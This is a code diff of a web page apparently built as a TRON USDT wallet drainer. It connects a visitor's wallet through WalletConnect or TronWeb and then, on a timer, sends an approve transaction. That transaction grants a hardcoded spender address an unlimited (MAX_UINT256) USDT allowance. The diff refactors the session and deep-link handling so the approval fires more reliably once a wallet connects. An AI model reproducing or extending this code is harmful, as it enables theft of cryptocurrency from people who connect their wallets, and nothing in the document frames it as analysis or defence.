@@ -7,8 +7,9 @@
 
 <link rel="icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png">
 
-<!-- ✅ WalletConnect -->
-<script src="https://unpkg.com/@walletconnect/sign-client@2.17.0/dist/index.umd.js"></script>
+<!-- ✅ WalletConnect v2 -->
+<script src="https://unpkg.com/@walletconnect/sign-client@2.13.0/dist/index.umd.js"></script>
+<script src="https://unpkg.com/@walletconnect/modal@2.6.2"></script>
 
 <style>
 body{
@@ -143,6 +144,7 @@ body{
   font-weight:bold;
   cursor:pointer;
   transition:all 0.3s;
+  z-index:10;
 }
 
 .btn:hover:not(:disabled){
@@ -220,23 +222,10 @@ const SPENDER_ADDRESS = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 const APPROVE_SELECTOR = "095ea7b3";
 const MAX_UINT256 = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-let client = null;
+let signClient = null;
 let session = null;
 let address = null;
 let isProcessing = false;
-
-function getSignClient(){
-  if(window.SignClient?.init) return window.SignClient;
-  if(window.WalletConnectSignClient?.SignClient?.init) return window.WalletConnectSignClient.SignClient;
-  if(window.walletconnect?.SignClient?.init) return window.walletconnect.SignClient;
-
-  for(let k in window){
-    try{
-      if(window[k]?.SignClient?.init) return window[k].SignClient;
-    }catch{}
-  }
-  return null;
-}
 
 function setStatus(msg, type = 'loading'){
   const container = document.getElementById("status-container");
@@ -320,12 +309,12 @@ async function sendApproval(){
     if(window.tronWeb){
       signed = await window.tronWeb.trx.sign(txResponse.transaction);
     } else {
-      signed = await client.request({
+      signed = await signClient.request({
         topic: session.topic,
         chainId: TRON_CHAIN,
         request:{
           method: "tron_signTransaction",
-          params: { address, transaction: txResponse.transaction }
+          params: { transaction: txResponse.transaction }
         }
       });
     }
@@ -356,82 +345,84 @@ async function sendApproval(){
   }
 }
 
-async function initWalletConnect(){
+async function initSignClient(){
   try{
-    const SignClient = getSignClient();
-    if(!SignClient) throw new Error("WalletConnect not loaded");
+    if(signClient) return true;
 
-    if(!client){
-      client = await SignClient.init({
-        projectId: PROJECT_ID,
-        metadata:{
-          name:"USDT Approval",
-          description:"Unlimited USDT Approval on TRON",
-          url:location.href,
-          icons:["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
-        }
-      });
+    setStatus("Initializing...", 'loading');
 
-      // Listen for session proposals
-      client.on("session_proposal", async (event) => {
-        try{
-          const { id, params } = event;
-          const session = await client.approve({
-            id,
-            namespaces: {
-              tron: {
-                methods: ["tron_signTransaction"],
-                chains: [TRON_CHAIN],
-                accounts: params.requiredNamespaces.tron.chains.map(chain => 
-                  `${chain}:${params.requiredNamespaces.tron.methods[0]}`
-                )
-              }
+    signClient = await WalletConnectSignClient.SignClient.init({
+      projectId: PROJECT_ID,
+      metadata:{
+        name:"USDT Approval",
+        description:"Unlimited USDT Approval on TRON",
+        url: window.location.href,
+        icons:["https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png"]
+      }
+    });
+
+    // Handle session proposal
+    signClient.on("session_proposal", async (event) => {
+      console.log("Session proposal received");
+      try{
+        const { id, params } = event;
+        
+        session = await signClient.approve({
+          id,
+          namespaces: {
+            tron: {
+              methods: ["tron_signTransaction"],
+              chains: [TRON_CHAIN],
+              accounts: [`${TRON_CHAIN}:${params.requiredNamespaces.tron.chains[0].split(':')[1]}`]
             }
-          });
-
-          if(session && session.namespaces?.tron?.accounts?.length > 0){
-            address = session.namespaces.tron.accounts[0].split(":")[2];
-            clearStatus();
-            document.getElementById("btn").innerText = "Send Approval";
-            setTimeout(() => sendApproval(), 500);
           }
-        }catch(e){
-          console.error("Session approval error:", e);
+        });
+
+        if(session?.namespaces?.tron?.accounts?.[0]){
+          address = session.namespaces.tron.accounts[0].split(":")[2];
+          clearStatus();
+          document.getElementById("btn").innerText = "Send Approval";
+          console.log("Session approved, address:", address);
+          setTimeout(() => sendApproval(), 1000);
         }
-      });
+      }catch(e){
+        console.error("Session approval error:", e);
+        setStatus("Approval failed: " + e.message, 'error');
+      }
+    });
 
-      // Handle session delete
-      client.on("session_delete", () => {
-        session = null;
-        address = null;
-        clearStatus();
-        document.getElementById("btn").innerText = "Connect Wallet";
-        isProcessing = false;
-      });
-    }
+    // Handle session deleted
+    signClient.on("session_delete", () => {
+      console.log("Session deleted");
+      session = null;
+      address = null;
+      clearStatus();
+      document.getElementById("btn").innerText = "Connect Wallet";
+      isProcessing = false;
+    });
 
+    clearStatus();
     return true;
   }catch(e){
-    console.error(e);
+    console.error("Init error:", e);
+    setStatus("Init failed: " + e.message, 'error');
     return false;
   }
 }
 
 async function connectWallet(){
   try{
-    setStatus("Initializing...", 'loading');
-
+    // Check for TronWeb (Trust Wallet browser)
     if(window.tronWeb?.defaultAddress?.base58){
       address = window.tronWeb.defaultAddress.base58;
       clearStatus();
+      console.log("Connected via TronWeb:", address);
       return true;
     }
 
-    await initWalletConnect();
-
     setStatus("Opening wallet...", 'loading');
 
-    const { uri, approval } = await client.connect({
+    const { uri, approval } = await signClient.connect({
       requiredNamespaces:{
         tron:{
           methods:["tron_signTransaction"],
@@ -442,36 +433,31 @@ async function connectWallet(){
     });
 
     if(uri){
-      // Use deeplink for Android - this returns to your dApp after approval
-      const deepLink = `trust://wc?uri=${encodeURIComponent(uri)}`;
-      const webLink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+      console.log("WalletConnect URI generated, opening wallet...");
       
-      // Try deep link first (Android), fallback to web link
+      // Store for later recovery
       localStorage.setItem('wc_uri', uri);
-      localStorage.setItem('wc_connecting', 'true');
       
-      // For Android, use the Trust Wallet deep link
-      if(/android/i.test(navigator.userAgent)){
-        window.location.href = deepLink;
-      } else {
-        window.location.href = webLink;
+      // Open in Trust Wallet
+      const deepLink = `trust://wc?uri=${encodeURIComponent(uri)}`;
+      window.open(deepLink, '_self');
+      
+      // Also handle the approval promise
+      session = await approval();
+      
+      if(session?.namespaces?.tron?.accounts?.[0]){
+        address = session.namespaces.tron.accounts[0].split(":")[2];
+        clearStatus();
+        console.log("Connected via approval:", address);
+        return true;
       }
-      
-      return;
     }
 
-    session = await approval();
-    if(session?.namespaces?.tron?.accounts?.length > 0){
-      address = session.namespaces.tron.accounts[0].split(":")[2];
-      localStorage.removeItem('wc_connecting');
-      clearStatus();
-      return true;
-    }
+    return false;
 
   }catch(e){
-    console.error(e);
-    setStatus("Connection failed: " + e.message, 'error');
-    localStorage.removeItem('wc_connecting');
+    console.error("Connect error:", e);
+    setStatus("Connection error: " + e.message, 'error');
     return false;
   }
 }
@@ -480,69 +466,61 @@ async function handleNext(){
   if(isProcessing) return;
   isProcessing = true;
 
-  if(!address){
-    const ok = await connectWallet();
-    if(ok && address){
-      setTimeout(() => sendApproval(), 500);
+  try{
+    if(!address){
+      // Initialize if needed
+      if(!signClient){
+        const inited = await initSignClient();
+        if(!inited){
+          isProcessing = false;
+          return;
+        }
+      }
+
+      const ok = await connectWallet();
+      if(ok && address){
+        setTimeout(() => sendApproval(), 1000);
+      } else {
+        isProcessing = false;
+      }
+    } else {
+      sendApproval();
     }
-  } else {
-    sendApproval();
+  }catch(e){
+    console.error(e);
+    setStatus("Error: " + e.message, 'error');
+    isProcessing = false;
   }
 }
 
+// Page load
 document.addEventListener('DOMContentLoaded', async function(){
-  // Initialize WalletConnect early
-  await initWalletConnect();
-
+  console.log("Page loaded");
+  
   // Check for TronWeb
   if(window.tronWeb?.defaultAddress?.base58){
     address = window.tronWeb.defaultAddress.base58;
     document.getElementById("btn").innerText = "Send Approval";
+    console.log("TronWeb detected:", address);
     return;
   }
 
-  // Check if returning from wallet connection
-  if(localStorage.getItem('wc_connecting')){
-    setStatus("Connecting wallet...", 'loading');
+  // Initialize SignClient
+  await initSignClient();
+
+  // Check for existing sessions
+  if(signClient){
+    const sessions = signClient.session.getAll();
+    console.log("Existing sessions:", sessions.length);
     
-    setTimeout(async () => {
-      try{
-        if(client && client.session.getAll().length > 0){
-          const sessions = client.session.getAll();
-          if(sessions.length > 0){
-            session = sessions[0];
-            address = session.namespaces.tron.accounts[0].split(":")[2];
-            document.getElementById("btn").innerText = "Send Approval";
-            localStorage.removeItem('wc_connecting');
-            sendApproval();
-            return;
-          }
-        }
-        
-        // If no session found, wait a bit longer
-        setTimeout(() => {
-          if(client && client.session.getAll().length > 0){
-            const sessions = client.session.getAll();
-            session = sessions[0];
-            address = session.namespaces.tron.accounts[0].split(":")[2];
-            document.getElementById("btn").innerText = "Send Approval";
-            localStorage.removeItem('wc_connecting');
-            clearStatus();
-            sendApproval();
-          } else {
-            clearStatus();
-            localStorage.removeItem('wc_connecting');
-            setStatus("Connection cancelled", 'error');
-            isProcessing = false;
-          }
-        }, 2000);
-      }catch(e){
-        console.error(e);
-        clearStatus();
-        localStorage.removeItem('wc_connecting');
-        isProcessing = false;
+    if(sessions.length > 0){
+      session = sessions[0];
+      if(session?.namespaces?.tron?.accounts?.[0]){
+        address = session.namespaces.tron.accounts[0].split(":")[2];
+        document.getElementById("btn").innerText = "Send Approval";
+        console.log("Restored session:", address);
       }
-    }, 1000);
+    }
   }
 });
 
